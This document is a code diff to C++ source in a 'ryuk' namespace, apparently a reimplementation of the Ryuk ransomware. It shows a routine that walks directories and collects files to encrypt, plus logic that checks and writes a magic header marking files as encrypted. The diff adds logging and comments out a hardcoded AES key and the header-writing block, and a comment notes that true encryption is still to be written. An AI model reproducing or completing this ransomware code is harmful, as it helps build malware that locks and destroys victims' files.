@@ -301,6 +301,7 @@ namespace ryuk {
                 if (_tcscmp(wfdFileData.cFileName, TEXT(".")) != 0 && _tcscmp(wfdFileData.cFileName, TEXT("..")) != 0)
                 {
                     fileOrDirectoryToEncrypt = (path + TEXT("\\") + wfdFileData.cFileName);
+                    _ftprintf_s(stdout, TEXT("\tEncrypting %ls\n"), path);
 
                     // If the wfdFileData structure is a directory, check if is not excluded, if not add it to our stack
                     if (wfdFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
@@ -466,32 +467,44 @@ namespace ryuk {
 
         // still need to write true encryption....
         // Generate a random AES-256 key and IV
-        string key = "abcdefghijklmnopqrstuvwxyz123456";  // 32 bytes for AES-256 key
+        /*string key = "abcdefghijklmnopqrstuvwxyz123456";  // 32 bytes for AES-256 key
         string iv = "abcdefghijklmnop";       // 16 bytes for AES IV            // Generate a random AES-256 key (32 bytes)
         _ftprintf_s(stderr, TEXT("generating AES key %s...\n"), key);
         _ftprintf_s(stderr, TEXT("generating AES IV %s...\n"), iv);
+        */
 
         // Function to check if the file is already encrypted (by looking for the magic header)
 
-        ifstream file(tFileLocation,ios::binary); 
+        ifstream file(tFileLocation); 
         if (!file.is_open()) {
             _ftprintf_s(stderr, TEXT("Could not open the file %s"), tFileLocation);
-            return 3;
         }
+        file.close();
 
+        /*
         // Read the magic header from the file
         string header(MAGIC_HEADER.size(), '\0');
         file.read(&header[0], MAGIC_HEADER.size());
         file.close();
-
         // Check if the file starts with the magic header
-        if (header == MAGIC_HEADER)
+        if (header == MAGIC_HEADER) {
             _ftprintf_s(stderr, TEXT("File %s encrypted already."), tFileLocation);
             return 4;
-
+        }
         
-        _ftprintf_s(stderr, TEXT("File encrypted successfully!"), tFileLocation);
-
+        else {
+            _ftprintf_s(stderr, TEXT("File header %s"), header);
+            ofstream fileOut(tFileLocation);
+            if (fileOut.is_open()) {
+                // Write the new content followed by the old content
+                fileOut << MAGIC_HEADER;
+                fileOut.close();
+            }
+            else {
+                _ftprintf_s(stderr, TEXT("File could not be encrypted %s"), tFileLocation);
+            }
+        }
+        */
         return 0;
     }
 
